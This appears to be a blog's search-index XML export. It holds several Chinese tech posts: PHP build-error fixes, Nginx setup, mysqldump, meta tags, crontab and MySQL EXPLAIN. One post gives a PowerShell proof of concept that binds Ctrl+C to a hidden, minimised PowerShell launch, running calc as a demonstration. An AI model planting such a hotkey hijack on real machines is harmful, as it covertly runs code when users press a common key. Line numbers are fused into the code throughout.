    <content type="text"><![CDATA[configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distributionFix: yum -y install libxslt-devel configure: error: Could not find net-snmp-config binary. Please check your net-snmp installationFix: yum -y install net-snmp-devel configure: error: Please reinstall readline - I cannot find readline.hFix: yum -y install readline-devel configure: error: Cannot find pspellFix: yum -y install aspell-devel configure: error: ODBC header file ‘/usr/include/sqlext.h’ not foundFix: yum -y install unixODBC-devel configure: error: Unable to detect ICU prefix or /usr/bin/icu-config failed. Please verify ICU install prefix and make sure icu-config works.Fix: yum -y install libicu-devel configure: error: utf8mime2text() has new signature, but U8TCANONICAL is missing. This should not happen. Check config.log for additional informationFix: yum -y install libc-client-devel configure: error: freetype.h not foundFix: yum -y install freetype-devel configure: error: xpm.h not foundFix: yum -y install libXpm-devel configure: error: png.h not foundFix: yum -y install libpng-devel configure: error: vpx_codec.h not foundFix: yum -y install libvpx-devel configure: error: Cannot find enchantFix: yum -y install enchant-devel configure: error: Please reinstall the libcurl distribution - easy.h should be in /include/curl/Fix: yum -y install libcurl-devel configure: error: mcrypt.h not found. Please reinstall libmcryptFix: 123456789wget https://sourceforge.mirrorservice.org/m/mc/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gztar zxf libmcrypt-2.5.7.tar.gzcd libmcrypt-2.5.7./configuremake &amp;&amp; make install Cannot find imapFix: ln -s /usr/lib64/libc-client.so /usr/lib/libc-client.so configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missingFix: yum -y install libc-client-devel Cannot find ldap.h yum -y install openldapFix: yum -y install openldap-devel configure: error: Cannot find ldap libraries in /usr/libFix: cp -frp /usr/lib64/libldap* /usr/lib/ configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation pathFix: yum -y install postgresql-devel configure: error: Please reinstall the lib curl distributionFix: yum -y install curl-devel configure: error: Could not find net-snmp-config binary. Please check your net-snmp installationFix: yum -y install net-snmp-devel configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distributionFix: yum -y install libxslt-devel configure: error: Please reinstall the BZip2 distributionFix: yum -y install bzip2-devel configure: error: Please reinstall the libcurl distribution – easy.h should be in/include/curl/Fix: yum -y install curl-devel configure: error: DBA: Could not find necessary header file(s)Fix: yum -y install db4-devel configure: error: jpeglib.h not foundFix: yum -y install libjpeg-devel configure: error: png.h not foundFix: yum -y install libpng-devel configure: error: freetype.h not foundFix: Reconfigure your PHP with the following option. --with-xpm-dir=/usr configure: error: libXpm.(a|so) not foundFix: yum -y install libXpm-devel configure: error: Unable to locate gmp.hFix: yum -y install gmp-devel configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missing. This should not happen. Check config.log for additional informationFix: yum -y install libc-client-devel configure: error: Cannot find ldap.hFix: yum -y install openldap-devel configure: error: ODBC header file ‘/usr/include/sqlext.h’ not foundFix: yum -y install unixODBC-devel configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation pathFix: yum -y install postgresql-devel configure: error: Please reinstall the sqlite3 distributionFix: yum -y install sqlite-devel configure: error: Cannot find pspellFix: yum -y install aspell-devel configure: error: SNMP sanity check failed. Please check config.log for more informationFix: yum -y install net-snmp-devel configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distributionFix: yum -y install libxslt-devel configure: error: xml2-config not found. Please check your libxml2 installationFix: yum -y install libxml2-devel checking for PCRE headers location… configure: error: Could not find pcre.h in /usrFix: yum -y install pcre-devel configure: error: Cannot find MySQL header files under yes. Note that the MySQL client library is not bundled anymoreFix: yum -y install mysql-devel checking for unixODBC support… configure: error: ODBC header file ‘/usr/include/sqlext.h’ not foundFix: yum -y install unixODBC-devel checking for pg_config… not found configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation pathFix: yum -y install postgresql-devel configure: error: Cannot find pspellFix: yum -y install pspell-devel configure: error: Could not find net-snmp-config binary. Please check your net-snmp installationFix: yum -y install net-snmp-devel configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distributionFix: yum -y install libxslt-devel]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 安装Nginx]]></title>
    <url>%2Farticles%2FCentOS7%20%E5%AE%89%E8%A3%85Nginx%2F</url>
    <content type="text"><![CDATA[1、nginx依赖于pcre库,要先安装pcre 1yum install pcre pcre-devel 2、下载nginx 1wget http://nginx.org/download/nginx-1.10.2.tar.gz 3、 解压安装包 1tar -zxvf nginx-1.10.2.tar.gz //解压安装包 4、编译安装 123456789./configure --prefix=/usr/local/nginx // 指定安装路径到/usr/local的nginx目录下--user=nginx \ // 指定用户--group=nginx \ // 指定组--with-http_ssl_module // 开启SSL加密功能make &amp;&amp; make install 5、启动 1./nginx 产生问题：不能绑定80端口, 80端口已经被占用 产生原因：有时是自己装了apache,nginx等,还有更多情况是操作系统自带了apache并作为服务启动，或者是阿里云的有个云盾，占用的也是这个端口 如何解决: 把占用80端口的软件或服务关闭即可，如下代码： 12345netstat -ant //查看端口当前状态netstat -autp //查看80端口占用的进程,我这里是21907kill -9 21907 //杀死占用80端口的进程21907（pkill -9 http //杀死所有交http的程序） 6、开机自启动 如果是直接yum安装, 则下面命令就足够了 1systemctl enable nginx.service 如果是编译安装，如下 1vi /lib/systemd/system/nginx.service 内容如下 123456789101112131415161718192021[Unit]Description=nginxAfter=network.target[Service]Type=forkingExecStart=/usr/local/nginx/sbin/nginxExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s quitPrivateTmp=true[Install]WantedBy=multi-user.target 解释: 123456789101112131415161718192021[Unit]:服务的说明Description:描述服务After:描述服务类别[Service]服务运行参数的设置Type=forking是后台运行的形式ExecStart为服务的具体运行命令ExecReload为重启命令ExecStop为停止命令PrivateTmp=True表示给服务分配独立的临时空间注意：[Service]的启动、重启、停止命令全部要求使用绝对路径[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3 保存退出。 1systemctl enable nginx.service 7.其他命令 启动nginx服务 1systemctl start nginx.service 设置开机自启动 1systemctl enable nginx.service 停止开机自启动 1systemctl disable nginx.service 查看服务当前状态 1systemctl status nginx.service 重新启动服务 1systemctl restart nginx.service 查看所有已启动的服务 1systemctl list-units --type=service]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[简单易用，用Powershell劫持Windows系统快捷键]]></title>
    <url>%2Farticles%2F%E7%AE%80%E5%8D%95%E6%98%93%E7%94%A8-%E7%94%A8Powershell%E5%8A%AB%E6%8C%81Windows%E7%B3%BB%E7%BB%9F%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[POC: 123456789101112131415$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut("desktop\desktoppayload.lnk") // 在桌面创建快捷方式按钮$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" // 执行文件$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21" // 设置快捷按钮图标$Shortcut.hotkey = "ctrl+c" // 快捷键$Shortcut.WindowStyle = '7' // 最小化执行，避免弹窗$Shortcut.Arguments = 'calc' // 执行参数$Shortcut.Save() 执行方法： 保存poc，命令行执行 1TYPE POC位置 | powershell.exe - profile - 删除快捷图标即可还原]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[window下数据库导入导出]]></title>
    <url>%2Farticles%2Fwindow%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%2F</url>
    <content type="text"><![CDATA[导出整个数据库mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名 1&gt; mysqldump -u dbuser -p dbname &gt; dbname.sql 导出一个表mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名 1&gt; mysqldump -u dbuser -p dbname users&gt; dbname_users.sql 导出一个数据库结构1mysqldump -u dbuser -p -d --add-drop-table dbname &gt;d:/dbname_db.sql -d 没有数据 –add-drop-table 在每个create语句之前增加一个drop table 导入数据库常用source 命令, 进入mysql数据库控制台，如 123mysql -u root -pmysql&gt; use 数据库 然后使用source命令，后面参数为脚本文件(如这里用到的.sql) 1mysql&gt; source d:/dbname.sql]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>导入导出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端知识点总结]]></title>
    <url>%2Farticles%2F%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[知识点一：DOCTYPE和浏览器渲染模式文档类型，一个文档类型标记是一种标准通用标记语言的文档类型声明，它的目的是要告诉标准通用标记语言解析器，它应该使用什么样的文档类型定义（DTD）来解析文档。Doctype还会对浏览器的渲染模式产生影响，不同的渲染模式会影响到浏览器对于 CSS 代码甚至 JavaScript 脚本的解析，所以Doctype是非常关键的，尤其是在 IE 系列浏览器中，由DOCTYPE 所决定的 HTML 页面的渲染模式至关重要。 浏览器解析HTML方式： 非怪异（标准）模式 怪异模式 部分怪异（近乎标准）模式 在“标准模式”(standards mode) 页面按照 HTML 与 CSS 的定义渲染，而在“怪异模式(quirks mode) 模式”中则尝试模拟更旧的浏览器的行为。 一些浏览器（例如，那些基于 Mozilla 的 Gecko 渲染引擎的，或者 Internet Explorer 8 在 strict mode 下）也使用一种尝试于这两者之间妥协的“近乎标准”(almost standards) 模式，实施了一种表单元格尺寸的怪异行为，除此之外符合标准定义。 一个不含任何 DOCTYPE 的网页将会以 怪异(quirks) 模式渲染。 HTML5提供的&lt;DOCTYPE html&gt;是标准模式，向后兼容的, 等同于开启了标准模式，那么浏览器就得老老实实的按照W3C的 标准解析渲染页面，这样一来，你的页面在所有的浏览器里显示的就都是一个样子了。 知识点二：html5文件类型声明（&lt;!DOCTYPE&gt;）仅有一型：&lt;!DOCTYPE HTML&gt;。 新的解析顺序：不再基于SGML。 新的元素：section, video, progress, nav, meter, time, aside, canvas,command, datalist, details, embed, figcaption, figure, footer,header, hgroup, keygen, mark, output, rp, rt, ruby, source, summary,wbr。 input 元素的新类型：date, email, url等等。 新的属性：ping（用于a与area）,charset（用于meta）, async（用于script）。 全域属性：id, tabindex, repeat。 新的全域属性：contenteditable, contextmenu, draggable, dropzone, hidden, spellcheck。 移除元素：acronym, applet, basefont, big, center, dir, font, frame, frameset, isindex, noframes, strike, tt。 知识点三：常用meta整理 概要 标签提供关于HTML文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。它可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。 ——W3School 必要属性 属性值描述contentsome text定义与http-equiv或name属性相关的元信息 可选属性 属性值描述 http-equivcontent-type / expire / refresh / set-cookie把content属性关联到HTTP头部。nameauthor / description / keywords / generator / revised / others把 content 属性关联到一个名称。contentsome text定义用于翻译 content 属性值的格式。 SEO优化参考文档 页面关键词，每个网页应具有描述该网页内容的一组唯一的关键字。 使用人们可能会搜索，并准确描述网页上所提供信息的描述性和代表性关键字及短语。标记内容太短，则搜索引擎可能不会认为这些内容相关。另外标记不应超过 874 个字符。 1&lt;meta name="keywords" content="your tags" /&gt; 页面描述，每个网页都应有一个不超过 150 个字符且能准确反映网页内容的描述标签。 1&lt;meta name="description" content="150 words" /&gt; 搜索引擎索引方式，robotterms是一组使用逗号(,)分割的值，通常有如下几种取值：none，noindex，nofollow，all，index和follow。确保正确使用nofollow和noindex属性值。 1234567891011121314151617&lt;meta name="robots" content="index,follow" /&gt;&lt;!-- all：文件将被检索，且页面上的链接可以被查询； none：文件将不被检索，且页面上的链接不可以被查询； index：文件将被检索； follow：页面上的链接可以被查询； noindex：文件将不被检索； nofollow：页面上的链接不可以被查询。--&gt; 页面重定向和刷新：content内的数字代表时间（秒），既多少时间后刷新。如果加url,则会重定向到指定网页（搜索引擎能够自动检测，也很容易被引擎视作误导而受到惩罚）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;meta http-equiv="refresh" content="0;url=" /&gt;&lt;meta name="author" content="author name" /&gt; &lt;!-- 定义网页作者 --&gt;&lt;meta name="google" content="index,follow" /&gt;&lt;meta name="googlebot" content="index,follow" /&gt;&lt;meta name="verify" content="index,follow" /&gt;移动设备viewport：能优化移动浏览器的显示。如果不是响应式网站，不要使用initial-scale或者禁用缩放。 &lt;!-- 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓 --&gt;&lt;meta name="HandheldFriendly" content="true"&gt;&lt;!-- 微软的老式浏览器 --&gt;&lt;meta name="MobileOptimized" content="320"&gt;&lt;!-- uc强制竖屏 --&gt;&lt;meta name="screen-orientation" content="portrait"&gt;&lt;!-- QQ强制竖屏 --&gt;&lt;meta name="x5-orientation" content="portrait"&gt;&lt;!-- UC强制全屏 --&gt;&lt;meta name="full-screen" content="yes"&gt;&lt;!-- QQ强制全屏 --&gt;&lt;meta name="x5-fullscreen" content="true"&gt;&lt;!-- UC应用模式 --&gt;&lt;meta name="browsermode" content="application"&gt;&lt;!-- QQ应用模式 --&gt;&lt;meta name="x5-page-mode" content="app"&gt;&lt;!-- windows phone 点击无高光 --&gt;&lt;meta name="msapplication-tap-highlight" content="no"&gt;网页相关申明编码&lt;meta charset='utf-8' /&gt;优先使用 IE 最新版本和 Chrome &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /&gt;&lt;!-- 关于X-UA-Compatible --&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=6" &gt;&lt;!-- 使用IE6 --&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=7" &gt;&lt;!-- 使用IE7 --&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=8" &gt;&lt;!-- 使用IE8 --&gt; 浏览器内核控制：国内浏览器很多都是双内核（webkit和Trident），webkit内核高速浏览，IE内核兼容网页和旧版网站。而添加meta标签的网站可以控制浏览器选择何种内核渲染。 1&lt;meta name="renderer" content="webkit|ie-comp|ie-stand"&gt; 国内双核浏览器默认内核模式如下： 搜狗高速浏览器、QQ浏览器：IE内核（兼容模式） 360极速浏览器、遨游浏览器：Webkit内核（极速模式） 禁止浏览器从本地计算机的缓存中访问页面内容：这样设定，访问者将无法脱机浏览。 12345678&lt;meta http-equiv="Pragma" content="no-cache"&gt;Windows 8&lt;meta name="msapplication-TileColor" content="#000"/&gt; &lt;!-- Windows 8 磁贴颜色 --&gt;&lt;meta name="msapplication-TileImage" content="icon.png"/&gt; &lt;!-- Windows 8 磁贴图标 --&gt;站点适配：主要用于PC-手机页的对应关系。&lt;meta name="mobile-agent"content="format=[wml|xhtml|html5]; url=url"&gt;&lt;!--[wml|xhtml|html5]根据手机页的协议语言，选择其中一种；url="url" 后者代表当前PC页所对应的手机页URL，两者必须是一一对应关系。 --&gt;&lt;meta http-equiv="Cache-Control" content="no-siteapp" /&gt;]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[crontab命令]]></title>
    <url>%2Farticles%2Fcrontab%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。 一、crond简介crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。 Linux下的任务调度分为两类，系统任务调度和用户任务调度。 系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。 /etc/crontab文件包括下面几行： 1234567891011121314151617[root@localhost ~]# cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed 前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。剩下部分的含义将在下个小节详细讲述， 这里不在多说。 用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。 使用者权限文件： 文件 说明 /etc/cron.deny 该文件中所列用户不允许使用crontab命令 /etc/cron.allow 该文件中所列用户允许使用crontab命令 /var/spool/cron 所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义：用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下： minute hour day month week command 其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 二、crond服务安装crontab： yum install crontabs 服务操作说明： 12345678/sbin/service crond start // 启动服务/sbin/service crond stop // 关闭服务/sbin/service crond restart // 重启服务/sbin/service crond reload // 重新载入配置 查看crontab服务状态： service crond status 手动启动crontab服务： service crond start 查看crontab服务是否已设置为开机启动，执行命令： ntsysv 加入开机自动启动： chkconfig –level 35 crond on 三、crontab命令详解3.1 命令格式123crontab [-u user] filecrontab [-u user] [ -e | -l | -r ] 3.2 命令功能通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。 3.3 命令参数-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。 file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 -e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。 -l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。 -r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。 -i：在删除用户的crontab文件时给确认提示。 3.4 常用方法1. 创建一个新的crontab文件在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的. profile文件，在其中加入这样一行： 1EDITOR=vi; export EDITOR 然后保存并退出。不妨创建一个名为&lt;user&gt; cron的文件，其中&lt;user&gt;是用户名，例如， davecron。在该文件中加入如下的内容。 12345# (put your own initials here)echo the date to the console every# 15minutes between 6pm and 6am0,15,30,45 18-06 * * * /bin/echo 'date' &gt; /dev/console 保存并退出。确信前面5个域用空格分隔 在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数： 1&gt; crontab davecron 现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。 同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。 2. 列出crontab文件为了列出crontab文件，可以用： 123&gt; crontab -l0,15,30,45,18-06 * * * /bin/echo `date` &gt; dev/tty1 你将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份： 1&gt; crontab -l &gt; $HOME/mycron 这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。 3. 编辑crontab文件如果希望添加、删除或编辑crontab文件中的条目，而E D I TO R环境变量又设置为v i，那么就可以用v i来编辑crontab文件，相应的命令为： 1&gt; crontab -e 可以像使用v i编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。 我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条： 123# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; 现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。 现在让我们使用前面讲过的crontab -l命令列出它的全部信息： 1234567891011$ crontab -l# (crondave installed on Tue May 4 13:07:43 1999)# DT:ech the date to the console every 30 minites0,15,30,45 18-06 * * * /bin/echo `date` &gt; /dev/tty1# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; 4. 删除crontab文件要删除crontab文件，可以用： 1$ crontab -r 5. 恢复丢失的crontab文件如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/&lt;username&gt;，其中&lt;username&gt;是用户名。如果由于权限问题无法完成拷贝，可以用： 1$ crontab \&lt;filename\&gt; 其中，&lt;filename&gt;是你在$ H O M E目录中副本的文件名。 建议你在自己的$ H O M E目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。 有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按&lt;Ctrl-D&gt;，否则你将丢失crontab文件。 3.5 使用实例实例1：每1分钟执行一次command1* * * * * command 实例2：每小时的第3和第15分钟执行13,15 * * * * command 实例3：在上午8点到11点的第3和第15分钟执行13,15 8-11 * * * command 实例4：每隔两天的上午8点到11点的第3和第15分钟执行13,15 8-11 */2 * * command 实例5：每个星期一的上午8点到11点的第3和第15分钟执行13,15 8-11 * * 1 command 实例6：每晚的21:30重启smb130 21 * * * /etc/init.d/smb restart 实例7：每月1、10、22日的4 : 45重启smb145 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的1 : 10重启smb110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb10,30 18-23 * * * /etc/init.d/smb restart 实例10：每星期六的晚上11 : 00 pm重启smb10 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb1* 23-7/1 * * * /etc/init.d/smb restart 实例13：每月的4号与每周一到周三的11点重启smb10 11 4 * mon-wed /etc/init.d/smb restart 实例14：一月一号的4点重启smb10 4 1 jan * /etc/init.d/smb restart 实例15：每小时执行/etc/cron.hourly目录内的脚本101 * * * * root run-parts /etc/cron.hourly 注意：如果去掉run-parts 这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了 四、使用注意事项4.1 注意环境变量问题有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。 在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。 不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点： 脚本中涉及文件路径时写全局路径； 脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如： 123456789cat start_cbp.sh#!/bin/shsource /etc/profileexport RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp; 当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如： 10 * * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh 4.2 注意清理系统用户的邮件日志每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。 例如，可以在crontab文件中设置如下形式，忽略日志输出： 10 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1 /dev/null 2&gt;&amp;1 表示先将标准输出重定向到 /dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。 4.3 系统级任务调度与用户级任务调度系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。 4.4 其他注意事项新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。 当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。 千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。 在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+%Y%m%d’。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql explain执行计划详解]]></title>
    <url>%2Farticles%2Fmysql-explain%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[id数字越大越先执行，如果说数字一样大，那么就从上往下依次执行，id列为null的就表是这是一个结果集，不需要使用它来进行查询。 select_type常见的有： simple：表示不需要union操作或者不包含子查询的简单select查询。有连接查询时，外层的查询为simple，且只有一个 primary：一个需要union操作或者含有子查询的select，位于最外层的单位查询的select_type即为primary。且只有一个 union：union连接的两个select查询，第一个查询是dervied派生表，除了第一个表外，第二个以后的表select_type都是union dependent union：与union一样，出现在union 或union all语句中，但是这个查询要受到外部查询的影响 union result：包含union的结果集，在union和union all语句中,因为它不需要参与查询，所以id字段为null subquery：除了from字句中包含的子查询外，其他地方出现的子查询都可能是subquery dependent subquery：与dependent union类似，表示这个subquery的查询要受到外部表查询的影响 derived：from字句中出现的子查询，也叫做派生表，其他数据库中可能叫做内联视图或嵌套select table显示的查询表名，如果查询使用了别名，那么这里显示的是别名，如果不涉及对数据表的操作，那么这显示为null，如果显示为尖括号括起来的就表示这个是临时表，后边的N就是执行计划中的id，表示结果来自于这个查询产生。如果是尖括号括起来的&lt;union M,N&gt;，与类似，也是一个临时表，表示这个结果来自于union查询的id为M,N的结果集。 type依次从好到差：system，const，eq_ref，ref，fulltext，ref_or_null，unique_subquery，index_subquery，range，index_merge，index，ALL，除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引 system：表中只有一行数据或者是空表，且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index const：使用唯一索引或者主键，返回记录一定是1行记录的等值where条件时，通常type是const。其他数据库也叫做唯一索引扫描 eq_ref：出现在要连接过个表的查询计划中，驱动表只返回一行数据，且这行数据是第二个表的主键或者唯一索引，且必须为not null，唯一索引和主键是多列时，只有所有的列都用作比较时才会出现eq_ref ref：不像eq_ref那样要求连接顺序，也没有主键和唯一索引的要求，只要使用相等条件检索时就可能出现，常见与辅助索引的等值查找。或者多列主键、唯一索引中，使用第一个列之外的列作为等值查找也会出现，总之，返回数据不唯一的等值查找就可能出现。 fulltext：全文索引检索，要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引 ref_or_null：与ref方法类似，只是增加了null值的比较。实际用的不多。 